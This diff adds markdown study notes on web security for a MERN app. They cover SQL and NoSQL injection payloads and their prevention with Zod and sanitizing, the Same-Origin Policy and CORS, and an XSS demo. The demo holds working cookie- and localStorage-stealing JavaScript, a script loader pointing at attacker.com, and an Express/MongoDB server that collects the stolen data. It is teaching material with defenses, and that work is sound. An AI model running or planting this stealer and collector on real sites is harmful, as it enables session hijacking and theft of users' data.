@@ -1321,3 +1321,834 @@ Redis is a **high-speed in-memory data store** used for:
 * Leaderboards
 
 It dramatically improves **application speed and scalability** by reducing database workload.
+
+
+# 🛡️ SQL / NoSQL Injection Security Guide (MERN Stack)
+
+## 📖 Overview
+
+Injection attacks are one of the most dangerous vulnerabilities in web applications.
+
+Even though the MERN stack uses **MongoDB (NoSQL)** instead of SQL, the same concept applies:
+
+> ⚠️ If you trust user input blindly, attackers can manipulate your database queries.
+
+---
+
+## 💡 What is SQL Injection?
+
+**SQL Injection (SQLi)** is when an attacker injects malicious SQL code into input fields to:
+
+- Bypass authentication  
+- Access sensitive data  
+- Modify or delete database records  
+
+---
+
+## 💥 Classic SQL Injection Example
+
+### ❌ Vulnerable Code
+
+    const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
+
+### 🔥 Malicious Input
+
+    email: admin@example.com
+    password: ' OR '1'='1
+
+### 💣 Final Query Becomes
+
+    SELECT * FROM users WHERE email = 'admin@example.com' AND password = '' OR '1'='1';
+
+👉 This condition is always TRUE → attacker logs in without password
+
+---
+
+## ⚠️ NoSQL Injection (MongoDB in MERN)
+
+MongoDB is not immune — it suffers from **NoSQL Injection**
+
+---
+
+## 💥 Example in MERN
+
+### ❌ Vulnerable Code
+
+    const user = await User.findOne({
+      email: req.body.email,
+      password: req.body.password
+    });
+
+### 🔥 Malicious Input (JSON)
+
+    {
+      "email": { "$ne": null },
+      "password": { "$ne": null }
+    }
+
+### 💣 What Happens?
+
+MongoDB interprets:
+
+    { email: { $ne: null }, password: { $ne: null } }
+
+👉 This means:
+- email ≠ null → true for many users  
+- password ≠ null → true  
+
+🚨 Result: attacker logs in as **any user**
+
+---
+
+## 🚨 Real Risks for Your Drive App
+
+If you're building something like Google Drive:
+
+- 📂 Unauthorized file access  
+- 🔓 Account takeover  
+- 🗑️ File deletion or modification  
+- 📤 Data leaks (private files exposed)  
+
+---
+
+## 🔐 How to Prevent Injection Attacks
+
+### 1. ✅ Never Trust User Input
+
+Always validate and sanitize input before using it.
+
+---
+
+### 2. ✅ Use Mongoose Safely
+
+Avoid passing raw objects directly from user input:
+
+    // ❌ Bad
+    User.findOne(req.body);
+
+    // ✅ Good
+    User.findOne({
+      email: String(req.body.email),
+      password: String(req.body.password)
+    });
+
+---
+
+### 3. ✅ Disable MongoDB Operators from Input
+
+Attackers use operators like:
+
+- $ne  
+- $gt  
+- $or  
+
+Install sanitizer:
+
+    npm install mongo-sanitize
+
+Usage:
+
+    import mongoSanitize from "mongo-sanitize";
+
+    const clean = mongoSanitize(req.body);
+
+---
+
+### 4. ✅ Use Strict Schema Validation
+
+    const userSchema = new mongoose.Schema({
+      email: { type: String, required: true },
+      password: { type: String, required: true }
+    }, { strict: true });
+
+---
+
+## 🧠 Role of Zod in Security
+
+### 📌 What is Zod?
+
+Zod is a **TypeScript-first schema validation library** used to validate user input.
+
+---
+
+## 🔐 How Zod Helps Prevent Injection
+
+Zod ensures:
+
+- Input is of correct type  
+- No unexpected objects are allowed  
+- Prevents malicious payloads like `{ $ne: null }`  
+
+---
+
+## ✅ Example with Zod
+
+    import { z } from "zod";
+
+    const loginSchema = z.object({
+      email: z.string().email(),
+      password: z.string().min(6)
+    });
+
+---
+
+### 🚫 Attack Attempt
+
+    {
+      "email": { "$ne": null },
+      "password": { "$ne": null }
+    }
+
+### ❌ Zod Result
+
+    ZodError: Expected string, received object
+
+👉 Attack blocked before hitting database
+
+---
+
+## 🔒 Using Zod in Express Middleware
+
+    const validate = (schema) => (req, res, next) => {
+      try {
+        req.body = schema.parse(req.body);
+        next();
+      } catch (err) {
+        return res.status(400).json({ error: err.errors });
+      }
+    };
+
+---
+
+## 🚀 Best Practices Summary
+
+- ✅ Always validate input (Zod)  
+- ✅ Sanitize input (mongo-sanitize)  
+- ✅ Avoid dynamic queries  
+- ✅ Use strict schemas  
+- ✅ Never trust client-side validation alone  
+- ✅ Hash passwords (bcrypt)  
+- ✅ Use authentication tokens (JWT)  
+
+---
+
+## 🧩 Final Thought
+
+> Injection attacks are not about SQL or MongoDB —  
+> they are about trusting user input blindly.
+
+If you:
+- Validate (Zod)  
+- Sanitize  
+- Control query structure  
+
+👉 You eliminate most real-world attacks
+
+
+
+# 🌐 Understanding Same-Origin Policy (SOP)
+
+## 📖 What is Same-Origin Policy?
+
+Same-Origin Policy (SOP) is a **browser security rule** that restricts how web pages interact with each other.
+
+> 👉 A website can only access resources from the SAME origin.
+
+---
+
+## 🧠 What is an Origin?
+
+An origin is defined by:
+
+    protocol + host + port
+
+---
+
+## ✅ Same Origin Example
+
+    http://example.com:80
+    http://example.com:80
+
+✔ Same protocol  
+✔ Same domain  
+✔ Same port  
+
+👉 SAME ORIGIN ✅
+
+---
+
+## ❌ Different Origin Examples
+
+### 1. Different Protocol
+
+    http://example.com
+    https://example.com
+
+👉 DIFFERENT ORIGIN ❌
+
+---
+
+### 2. Different Domain
+
+    https://example.com
+    https://api.example.com
+
+👉 DIFFERENT ORIGIN ❌ (subdomain counts!)
+
+---
+
+### 3. Different Port
+
+    http://localhost:3000
+    http://localhost:4000
+
+👉 DIFFERENT ORIGIN ❌
+
+---
+
+## ❗ What DOES NOT affect origin
+
+### Path
+
+    https://example.com/page1
+    https://example.com/page2
+
+👉 SAME ORIGIN ✅
+
+---
+
+### Query Params
+
+    https://example.com?x=1
+    https://example.com?x=2
+
+👉 SAME ORIGIN ✅
+
+---
+
+### Hash
+
+    https://example.com#home
+    https://example.com#about
+
+👉 SAME ORIGIN ✅
+
+---
+
+## 🔐 Why Same-Origin Policy exists
+
+To prevent malicious websites from:
+
+- ❌ Reading your bank data
+- ❌ Accessing cookies from other sites
+- ❌ Making unauthorized requests
+
+---
+
+## 💥 Example Attack (Without SOP)
+
+Imagine:
+
+    You are logged into bank.com
+
+Then you visit:
+
+    evil.com
+
+Without SOP, evil.com could:
+
+- Read your bank account data ❌
+- Steal session cookies ❌
+
+👉 SOP prevents this
+
+---
+
+## ⚠️ SOP Restricts
+
+- Reading API responses from another origin
+- Accessing DOM of another site
+- Accessing cookies of another domain
+
+---
+
+## 🚀 Then how do apps communicate?
+
+👉 Using **CORS (Cross-Origin Resource Sharing)**
+
+---
+
+## 🔓 CORS Example (Backend - Express)
+
+    app.use(cors({
+      origin: "http://localhost:5173",
+      credentials: true
+    }));
+
+👉 Allows frontend to talk to backend
+
+---
+
+## 💻 Real Project Example (MERN)
+
+    Frontend: http://localhost:5173
+    Backend:  http://localhost:4000
+
+👉 Different ports → DIFFERENT ORIGIN ❌
+
+➡️ Need CORS to allow communication
+
+---
+
+## 🧠 Important Rule
+
+> If protocol OR domain OR port changes → origin changes
+
+---
+
+## 🧩 SOP vs CORS
+
+| Feature | Purpose |
+|--------|--------|
+| SOP | Blocks cross-origin access |
+| CORS | Allows controlled access |
+
+---
+
+## 🔥 TL;DR
+
+- Origin = protocol + domain + port  
+- Same origin → full access  
+- Different origin → blocked by default  
+- CORS → allows safe communication  
+
+---
+
+## 💬 Final Thought
+
+> SOP protects users  
+> CORS enables developers  
+
+Both together make the web secure AND usable
+
+
+
+
+# 🚨 XSS Attack Demo (Client + Attacker Server)
+
+## 📖 Overview
+
+This demonstrates how a **Cross-Site Scripting (XSS)** attack works:
+
+1. Attacker injects a script into a vulnerable website  
+2. That script loads a malicious JS file  
+3. Malicious JS steals user data (cookies + localStorage)  
+4. Data is sent to attacker’s server  
+5. Attacker stores the stolen data  
+
+---
+
+# 🧠 Part 1: Injected Script (Client-side)
+
+```js
+const s = document.createElement("script");
+s.src = "http://localhost:8000/steal.js";
+document.body.appendChild(s);
+🔍 What this does
+
+Dynamically creates a <script> tag
+
+Loads external JS from attacker server
+
+Executes it inside victim’s browser
+
+Equivalent to:
+
+<script src="http://localhost:8000/steal.js"></script>
+⚠️ Why this is dangerous
+
+Browser trusts this script (runs in your site's context)
+
+It can access:
+
+cookies 🍪
+
+localStorage 📦
+
+DOM 🧾
+
+🧠 Part 2: Malicious Script (steal.js)
+async function stealData() {
+  const cookies = document.cookie
+    ? Object.fromEntries(document.cookie.split("; ").map((c) => c.split("=")))
+    : {};
+
+  const localStorageData = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    localStorageData[key] = localStorage.getItem(key);
+  }
+
+  if (Object.keys(cookies).length || Object.keys(localStorageData).length) {
+    const response = await fetch("http://localhost:8000/victim", {
+      method: "POST",
+      body: JSON.stringify({ cookies, localStorage: localStorageData }),
+      headers: {
+        "Content-Type": "application/json",
+      },
+    });
+
+    const data = await response.json();
+    console.log(data);
+  } else {
+    console.log("Could not steal anything. Your website is very secure.");
+  }
+}
+
+stealData();
+🔍 What this script does
+1. 🍪 Reads cookies
+document.cookie
+
+Converts:
+
+token=abc123; user=jeff
+
+Into:
+
+{
+  token: "abc123",
+  user: "jeff"
+}
+2. 📦 Reads localStorage
+localStorage.getItem(key)
+
+Collects:
+
+{
+  token: "jwt_token",
+  user: "jeff"
+}
+3. 🚀 Sends data to attacker
+fetch("http://localhost:8000/victim", {...})
+
+👉 Sends stolen data to attacker server
+
+🧠 Part 3: Attacker Server (Express + MongoDB)
+import express from "express";
+import mongoose from "mongoose";
+import cors from "cors";
+
+const app = express();
+
+app.use(cors());
+app.use(express.json());
+
+await mongoose.connect(
+  "mongodb://admin:admin@localhost/xssAttackData?authSource=admin"
+);
+
+const victimSchema = new mongoose.Schema({
+  cookies: {},
+  localStorage: {},
+  website: String,
+});
+
+const Victim = mongoose.model("victim", victimSchema);
+
+// Serve malicious files (like steal.js)
+app.use(express.static("./public"));
+
+app.post("/victim", async (req, res) => {
+  const { cookies, localStorage } = req.body;
+
+  console.log(req.body);
+
+  const victim = await Victim.create({
+    localStorage: localStorage,
+    cookies: cookies,
+    website: req.headers.origin,
+  });
+
+  return res
+    .status(201)
+    .json({ message: "Stolen all this data.", data: victim });
+});
+
+app.listen(8000, () =>
+  console.log("Server running on http://localhost:8000")
+);
+🔍 What this server does
+1. 📂 Serves malicious script
+app.use(express.static("./public"));
+
+👉 Makes steal.js available at:
+
+http://localhost:8000/steal.js
+2. 📥 Receives stolen data
+app.post("/victim", ...)
+
+👉 Receives:
+
+{
+  "cookies": {...},
+  "localStorage": {...}
+}
+3. 💾 Stores stolen data
+await Victim.create({...})
+
+👉 Saves into MongoDB
+
+4. 🌐 Tracks victim site
+website: req.headers.origin
+
+👉 Records which website was attacked
+
+💥 Full Attack Flow
+Attacker injects script
+        ↓
+Victim loads webpage
+        ↓
+Browser loads steal.js from attacker server
+        ↓
+steal.js reads cookies + localStorage
+        ↓
+Sends data to /victim
+        ↓
+Server stores stolen data in MongoDB
+⚠️ Why this works
+
+Script runs inside victim’s site (trusted context)
+
+Browser allows access to:
+
+cookies (unless httpOnly)
+
+localStorage
+
+SOP does NOT stop this (same-origin execution)
+
+🔐 How to Prevent This
+✅ 1. Use HTTP-only cookies
+res.cookie("token", token, {
+  httpOnly: true,
+});
+✅ 2. Avoid innerHTML
+// ❌ unsafe
+div.innerHTML = userInput;
+
+// ✅ safe
+div.textContent = userInput;
+✅ 3. Use React safely
+<p>{userInput}</p> // auto-escaped
+❌ Avoid
+dangerouslySetInnerHTML={{ __html: userInput }}
+✅ 4. Content Security Policy (CSP)
+Content-Security-Policy: script-src 'self'
+
+👉 Blocks external scripts
+
+🧩 Key Takeaway
+
+XSS allows attackers to run JavaScript inside your website
+→ which lets them steal user data
+
+🚀 TL;DR
+
+Inject script → load malicious JS
+
+JS steals cookies + localStorage
+
+Sends data to attacker server
+
+Server stores everything
+
+👉 Protect by:
+
+validating input
+
+avoiding raw HTML rendering
+
+using httpOnly cookies
+
+applying CSP
+
+
+---
+
+If you want next, I can:
+👉 show how to **simulate this attack on your own MERN app safely**  
+👉 or help you **secure your auth system against XSS completely** 🔐
+
+
+
+
+
+# 🛡️ Complete Web Security Notes (SOP + XSS + Script Injection + onerror)
+
+---
+
+# 🌐 1. Same-Origin Policy (SOP)
+
+## 📖 What is SOP?
+
+Same-Origin Policy is a **browser security rule** that prevents one website from reading sensitive data from another website.
+
+> 👉 Origin = protocol + domain + port
+
+---
+
+## 🧠 Examples
+
+### ❌ Different Origin
+
+http://localhost:3000  
+http://localhost:4000  
+
+👉 Different port → NOT same origin
+
+---
+
+### ✅ Same Origin
+
+https://example.com  
+https://example.com/page  
+
+👉 Path doesn’t matter → SAME origin
+
+---
+
+## 🔐 What SOP Prevents
+
+- ❌ Reading API responses from other sites  
+- ❌ Accessing cookies from another domain  
+- ❌ Accessing DOM of another site  
+- ❌ Reading localStorage/sessionStorage  
+
+---
+
+## ⚠️ Important
+
+👉 SOP **allows sending requests**  
+👉 SOP **blocks reading responses**
+
+---
+
+# 🚨 2. What is XSS (Cross-Site Scripting)
+
+## 📖 Definition
+
+XSS is when an attacker injects **malicious JavaScript into your website**, which runs in other users’ browsers.
+
+---
+
+## 💥 Example
+
+```html
+<script>alert("Hacked")</script>
+
+
+⚔️ 3. XSS Attack Flow
+
+Attacker injects input
+↓
+Website renders it unsafely
+↓
+Browser executes malicious JS
+↓
+JS steals cookies/localStorage
+↓
+Sends data to attacker
+
+🧪 4. Script Injection (Dynamic Script Tag)
+📌 Code
+const s = document.createElement("script");
+s.src = "http://attacker.com/steal.js";
+document.body.appendChild(s);
+🧠 What happens
+
+Creates <script> tag
+
+Loads external JS
+
+Runs inside your site
+
+Equivalent to:
+
+<script src="http://attacker.com/steal.js"></script>
+🧪 5. Malicious Script (steal.js)
+📌 Code
+async function stealData() {
+  const cookies = document.cookie
+    ? Object.fromEntries(document.cookie.split("; ").map((c) => c.split("=")))
+    : {};
+
+  const localStorageData = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    localStorageData[key] = localStorage.getItem(key);
+  }
+
+  await fetch("http://localhost:8000/victim", {
+    method: "POST",
+    body: JSON.stringify({ cookies, localStorage: localStorageData }),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  });
+}
+
+stealData();
+🔍 What this does
+🍪 Step 1: Reads cookies
+document.cookie
+📦 Step 2: Reads localStorage
+localStorage.getItem(key)
+📡 Step 3: Sends data to attacker
+fetch("http://localhost:8000/victim", ...)
+🖥️ 6. Attacker Server (Express + MongoDB)
+📌 Code
+import express from "express";
+import mongoose from "mongoose";
+import cors from "cors";
+
+const app = express();
+
+app.use(cors());
+app.use(express.json());
+
+await mongoose.connect(
+  "mongodb://admin:admin@localhost/xssAttackData?authSource=admin"
+);
+
+const victimSchema = new mongoose.Schema({
+  cookies: {},
+  localStorage: {},
+  website: String,
+});
+
+const Victim = mongoose.model("victim", victimSchema);
+
+// Serve malicious JS
+app.use(express.static("./public"));
+
+app.post("/victim", async (req, res) => {
+  const { cookies, localStorage } = req.body;
+
+  const victim = await Victim.create({
+    localStorage,
+    cookies,
+    website: req.headers.origin,
+  });
+
+  res.status(201).json({ message: "Data stored", data: victim });
+});
+
+app.listen(8000, () => console.log("Server running"));
+🧠 What this server does
+
+Serves malicious file (steal.js)
+
+Receives stolen data
+
+Stores it in MongoDB
